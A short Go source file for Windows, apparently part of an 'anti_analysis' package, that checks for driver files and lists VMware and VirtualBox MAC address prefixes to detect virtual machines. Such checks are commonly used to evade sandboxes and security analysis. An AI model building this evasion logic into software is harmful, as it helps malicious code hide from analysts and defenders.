//go:build windows

package anti_analysis

import (
	"golang.org/x/sys/windows"
	"os"
)

type AntiVM struct{}

func NewAntiVM() *AntiVM {
	return &AntiVM{}
}

func (a *AntiVM) processExists(name string) bool {
	_, err := os.Stat("C:\\Windows\\System32\\drivers\\" + name)
	return err == nil
}

// vmMacs is a list of VM vendor MAC prefixes
var vmMacs = []string{
	"00:0C:29", // VMware
	"00:50:56", // VMware
	"00:05:69", // VMware
	"08:00:27", // VirtualBox
}
